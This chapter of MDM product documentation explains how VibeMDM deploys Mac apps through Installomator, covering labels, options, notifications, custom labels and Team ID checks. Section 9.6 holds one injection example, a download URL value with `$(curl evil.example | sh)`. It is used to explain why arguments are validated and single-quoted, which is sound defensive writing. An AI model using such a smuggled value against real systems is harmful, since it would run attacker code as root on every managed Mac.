# 9. Mac Apps and Installomator

VibeMDM vendors [Installomator](https://github.com/Installomator/Installomator) **v10.8** (the bundled script
identifies itself as `10.8beta`, dated 2025-03-28; Apache-2.0; the license is served at `/agent/installomator-license`). Installomator is a community script with over a thousand *labels*,
each of which knows how to find the latest version of an app at the vendor, download it, verify its code
signature against the vendor's Apple Developer **Team ID** and install it.

The agent downloads the server's copy of the script (`GET /agent/v1/installomator`) to
`/Library/Application Support/VibeMDM/Installomator.sh` and refreshes it when it is more than a day old. It runs it as
root with `/bin/zsh <script> <args…>`, passing the arguments as argv, without a shell.

## 9.1 Where Installomator is used

| Where | What it does |
| --- | --- |
| **Mac Apps catalog** | The one place an app is defined (label and options). Installed automatically on every Mac in scope, or offered in Self Service only; installed once or kept up to date |
| **Policy step** | A policy's *Mac Apps* tab adds catalog apps (their label and options) alongside scripts and packages, with the policy's trigger, frequency and logs ([Chapter 7](07-policies-scripts-packages.md)). An Installomator label can still be used directly, with its own options, under *Use an Installomator label directly* |
| **Onboarding step** | An onboarding `app` step installs a catalog app with a live progress row ([Chapter 14](14-white-glove-onboarding.md)) |
| **swiftDialog bootstrap** | Onboarding installs swiftDialog with the `swiftdialog` label if `/usr/local/bin/dialog` is missing |
| **Escrow Buddy remediation** | FileVault key repair installs Escrow Buddy with the `escrowbuddy` label ([Chapter 11](11-filevault.md)) |
| **XCreds** | Identity → XCreds creates a catalog app with the `xcreds` label ([Chapter 13](13-identity-xcreds.md)) |

## 9.2 The Mac Apps catalog

| Field | JSON | Notes |
| --- | --- | --- |
| Name, category, description | `name`, `category`, `description` | |
| Label | `label` | A shipped label (`googlechrome`, `zoom`, `microsoftteamsnew`, …) or `custom:<key>` |
| Deployment | `deployment` | `automatic`: installed on every Mac in scope. `self_service`: offered in Self Service to Macs in scope and installed only when someone clicks Install |
| Updates | `update_behavior` | `keep_updated` (re-runs weekly; Installomator only downloads when a newer version exists) or `install_once` |
| Options | `options` | §9.4 |
| Enabled, scope | `enabled`, `scope` | |
| Self Service | `self_service` | `enabled` (for automatic apps: also list it, e.g. to reinstall; always on for Self Service apps), `display_name`, `description`, `button_text`, `category`, `featured` |

### Add an app

1. **Mac Apps → New**. Search the label list (`GET /api/v1/apps/labels`) and pick the label.
2. Choose the update behaviour and options, set the scope, optionally enable Self Service, save
   (`POST /api/v1/apps`).
3. At each `checkin` or `startup` check-in, every in-scope Mac for which the app is **due** gets an install job:

   | Deployment and updates | Due when |
   | --- | --- |
   | automatic, `keep_updated` | No completed install in the last 7 days |
   | automatic, `install_once` | No completed install ever |
   | Self Service, `keep_updated` | The app is installed on the Mac (a completed install, from Self Service or anywhere else VibeMDM ran it, or the agent's inventory lists an app of that name) and there was no completed install in the last 7 days. Macs without it get nothing until someone installs it from Self Service |
   | Self Service, `install_once` | Never automatically: only from Self Service |
   | any | No install pending in the last 2 hours (prevents duplicates) |

   A Mac App used by a policy cannot be deleted until it is removed from those policies.

4. Results: `GET /api/v1/apps/{id}/logs` (one app) or `GET /api/v1/apps/logs` (all), and the computer's
   activity. Each log has a status (`pending`, `completed`, `failed`), the trigger and Installomator's output.

The Health check **Failing app installs** opens when an app's latest run failed on at least 3 Macs and on at least
half of the Macs it ran on in the last 7 days, which usually means a broken label or a vendor change.

### Icons

Each app can have an icon (**Mac Apps → app → Self Service → Icon**, or `PUT /api/v1/apps/{id}/icon` with the file
as the request body; `DELETE` removes it). Upload a PNG, JPEG or `.icns` file of up to 4 MB. VibeMDM decodes it and
stores a fresh PNG of at most 256 × 256 pixels, so nothing but the pixels survives (no metadata, no scripts in SVGs:
SVG is not accepted). The icon is saved straight away, separately from **Save changes**.

Icons are files in the assets folder (`app-icons/<app id>-<version>.png`, see [§2.2](02-installation.md#storage)). The version
is the start of the PNG's SHA-256, so a replaced icon gets a new name and every cache notices. Removing an app
removes its icon, and icons of apps that no longer exist are removed at start-up.

On the Mac, the agent downloads an icon the first time Self Service or a notification needs it and keeps it in
`/Library/Application Support/VibeMDM/cache/app-icons`. A newer version replaces the old file, and icons of apps that
Self Service no longer lists are deleted when the list is loaded. Apps without an uploaded icon show the installed
app's own icon, or a letter tile when the app is not installed.

## 9.3 Labels

Over a thousand labels ship with Installomator. Each defines the download URL logic, the archive type, the app
name and the **expected Team ID**. Installomator compares the downloaded app's or package's signature with that
Team ID and refuses to install on a mismatch.

Find a vendor's Team ID on a Mac where the app is installed:

```bash
codesign -dv --verbose=4 /Applications/Slack.app 2>&1 | grep TeamIdentifier
spctl -a -vv /Applications/Slack.app       # also shows the notarization source
pkgutil --check-signature Installer.pkg    # for packages
```

## 9.4 Options

| Option | Values | Installomator variable | Default sent by VibeMDM |
| --- | --- | --- | --- |
| Notify | `success`, `silent`, `all` | `NOTIFY` | `silent` |
| Blocking process action | `ignore`, `silent_fail`, `prompt_user`, `prompt_user_loop`, `prompt_user_then_kill`, `tell_user`, `tell_user_then_kill`, `kill` | `BLOCKING_PROCESS_ACTION` | `prompt_user` |
| Reopen | `yes`, `no` | `REOPEN` | Installomator's default |
| Ignore App Store apps | `yes`, `no` | `IGNORE_APP_STORE_APPS` | Installomator's default |
| Force install | on/off | `INSTALL=force` | off |

`POST /api/v1/apps/installomator-preview` with a label and options returns the exact argument list VibeMDM will
send, for example:

```
googlechrome DEBUG='0' NOTIFY='silent' BLOCKING_PROCESS_ACTION='prompt_user'
```

### Notifications

The agent always runs Installomator with `NOTIFY=silent` and posts the notification itself. Installomator's own
notifications use `osascript`, which macOS shows with Script Editor's icon, and clicking one opens Script Editor.

| Notify | The agent shows |
| --- | --- |
| `silent` | Nothing |
| `success` | "*App* is ready" (or "*App* was updated") after an install or update |
| `all` | The above, plus "*App* is already up to date" and "*App* could not be installed" |

Installomator's "download in progress" notifications are not shown; Self Service shows progress instead.

The notification is posted with swiftDialog (`dialog --notification`), which installs with Self Service. It shows the
app's uploaded icon (or the installed app's own icon), and clicking it opens the app that was just installed.
macOS still shows swiftDialog's small icon as the sender. Without swiftDialog the agent falls back to `osascript`,
which has Script Editor's icon and click behaviour.

> **Untested on real hardware:** the swiftDialog notification (icon, and the click opening the app through
> `--button1action file:///Applications/…app`) has not been tried on a Mac yet.

`DEBUG='0'` is always sent. The bundled Installomator script keeps upstream's default of `DEBUG=1`, in which it
downloads and verifies the app but installs nothing and still exits 0; the agent also adds `DEBUG=0` when an older
server leaves it out.

## 9.5 Custom labels

For an app Installomator doesn't know, define a **custom label** (**Mac Apps → Custom Labels**,
`/api/v1/custom-labels`). VibeMDM passes it to Installomator through its documented `valuesfromarguments` label.

| Field | Required | Validation |
| --- | --- | --- |
| `key` | yes | 2–41 characters, lowercase letters, digits, `-`, `_`. Reference it as `custom:<key>` |
| `name` | yes | Printable text, up to 128 characters (the app or package name) |
| `type` | yes | `dmg`, `pkg`, `zip`, `tbz`, `pkgInDmg`, `pkgInZip`, `appInDmgInZip` |
| `download_url` | yes | A plain `https://` URL without spaces, quotes, `` ` ``, `$` or `\` |
| `expected_team_id` | yes | Exactly 10 uppercase letters or digits. The install fails if the signature doesn't match |
| `package_id` | no | For `pkg` types: the package receipt ID used to detect the installed version |
| `app_name` | no | The `.app` name if it differs from `name` |
| `archive_name` | no | Downloaded file name |
| `version_key` | no | `Info.plist` key holding the version (default `CFBundleShortVersionString`) |
| `app_new_version` | no | Latest version string, so Installomator can skip up-to-date Macs |
| `blocking_processes` | no | Process names that block installation |

Example generated arguments:

```
valuesfromarguments name='Acme Agent' type='pkg' downloadURL='https://downloads.acme.example/agent.pkg'
expectedTeamID='ABCDE12345' packageID='com.acme.agent' blockingProcesses=( 'Acme Agent' )
DEBUG='0' NOTIFY='silent' BLOCKING_PROCESS_ACTION='prompt_user'
```

## 9.6 Why arguments are single-quoted

Installomator runs `eval` on every `key=value` argument. A crafted value such as
`downloadURL=https://x/$(curl evil.example | sh)` would execute as root on every Mac in scope. VibeMDM prevents this
in two layers:

1. **Validation:** every field must match a strict pattern (https-only URLs without shell metacharacters, a
   10-character Team ID, enumerated option values).
2. **Quoting:** every value is wrapped in single quotes, with embedded single quotes escaped as `'\''`. When
   Installomator `eval`s `downloadURL='…'`, zsh can only assign a literal string.

The agent passes the arguments as argv without a shell, so no other interpretation happens on the way. Tests in
`internal/installomator` run hostile values through a real shell `eval` to prove they stay literal.

> **Study note (Gatekeeper, notarization, Team IDs):** every app distributed outside the Mac App Store should be
> signed with a **Developer ID Application** certificate, and every package with **Developer ID Installer**. Both
> include the developer's **Team ID**. Since macOS 10.15, Gatekeeper also requires **notarization** (an automated
> Apple malware scan) for software downloaded from the internet that carries the `com.apple.quarantine` attribute.
> Installomator's Team ID check is a stronger, organization-side control on top of that: it pins the publisher, not
> just "signed by someone Apple knows". Note that files downloaded by a root script such as Installomator are
> generally **not** quarantined, so Gatekeeper's first-launch check does not apply to them. That is exactly why
> pinning the Team ID matters.

Next: [Chapter 10 — Software updates](10-software-updates.md).
